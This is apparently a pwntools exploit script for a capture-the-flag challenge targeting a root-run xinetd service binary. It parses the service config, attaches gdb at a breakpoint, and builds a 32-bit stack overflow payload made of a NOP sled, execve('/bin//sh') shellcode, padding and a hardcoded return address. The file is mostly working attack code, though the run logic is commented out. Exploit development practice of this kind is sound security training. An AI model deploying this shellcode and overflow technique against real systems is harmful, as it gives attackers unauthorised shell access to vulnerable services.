import time
import ctypes
import json
import sys
import argparse
from pprint import pprint
from struct import pack
from pwn import *

context.terminal = ["tmux", "split", "-h"] 
context.arch = 'i386'
    
def split_line(line, delem):
    '''
    strips the incomming line then splits it based off the specified delem,
      then returns each piece stripped
    '''
    line = line.strip().split(delem)
    return [x.strip() for x in line]


class Config(object):
    conf = None
    def __init__(self):
       pass 

    def get_config(self):
        return self.conf

class Escalate(Config):
    '''
    Handles conf of the following format
        service seedgander 
        {
            flags           = REUSE
            socket_type     = stream
            protocol        = tcp
            wait            = no
            user            = root
            server          = /opt/seedgander
            disable         = no
            port            = 9866
            instances       = UNLIMITED
            type            = UNLISTED
        }
    '''

    def __init__(self, conf_filepath):
        Config.conf = self._read_conf(conf_filepath)

    def _read_conf(self, conf_file):
        '''
        Parse files of the format:
            service seedgander 
            {
                flags           = REUSE
                socket_type     = stream
                protocol        = tcp
                wait            = no
                user            = root
                server          = /opt/seedgander
                disable         = no
                port            = 9866
                instances       = UNLIMITED
                type            = UNLISTED
            }
        by skipping the {, }  and only parsing the string protions
        '''
        lines = []
        with open(conf_file, 'r') as f:
            lines = f.readlines()
        d = {}
        tmp = split_line(lines[0],' ')
        d[tmp[0]] = tmp[1]
        for i in range(1, len(lines)):
            tmp = split_line(lines[i],'=')
            if len(tmp) != 2:
                continue
            d[tmp[0]] = tmp[1]
        return d

def parse_opts():
    '''
    Parse arguments 
    '''
    parser = argparse.ArgumentParser(description='CTF execution')
    parser.add_argument('-b','--binary', action='store', required=True)
    parser.add_argument('-c','--conf', action='store', required=True)
    parser.add_argument('-r','--remote', action='store', 
        help='If present, run remote against specified conf',
        default=None)
    return parser.parse_args()

GBL_LINE_CTR = 0 
def log_response(line):
    global GBL_LINE_CTR 
    print(GBL_LINE_CTR,line)
    GBL_LINE_CTR +=1

def build_payload():
    payload =  b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    payload += b"\x31\xc0\x50\x68\x2f\x2f\x73"
    payload += b"\x68\x68\x2f\x62\x69\x6e\x89"
    payload += b"\xe3\x89\xc1\x89\xc2\xb0\x0b"
    payload += b"\xcd\x80\x31\xc0\x40\xcd\x80"
    payload += b'\x41'*476
    payload += p32(0xffcf1b68)
    return payload


class CTF_Prob(object):
    conf = None
    remote = None
    binary = None
    proc = None
    def __init__(self, conf, binary, remote=None):
        self.conf = conf
        self.binary = binary
#        self.proc = process(binary)
    
    def gdb_attach(self):
        gdb.debug(self.binary,'''
                handle SIGALRM ignore
                break *0x0804863b
                continue
            ''')

    
    def start_process(self):
        self.proc = process(self.binary)
#        self.proc.interactive()
        self.gdb_attach()
        return self.proc
    
    def read_line(self):
        print(self.proc.recvline())
    
    def send_payload(self, payload):
        self.proc.sendline(payload)

#    def run(self):
#        print(self.proc.recvline())
#        print(self.proc.recvline())
#        print(self.proc.recvline())
#        print(self.proc.recvline())
#        self.proc.sendline('y')
#        print(self.proc.recvline())
#        print(self.proc.recvline())
#        print(self.proc.recvline())
#        print(self.proc.recvline())
#        print(self.proc.recvline())
#        print(self.proc.recvline())
##        self.proc.sendline(build_payload())
##        print(self.proc.recvline())
##        print(self.proc.recvline())

def set_context():
    #context.update(arch="i386", os="linux", bits=32)
    return context
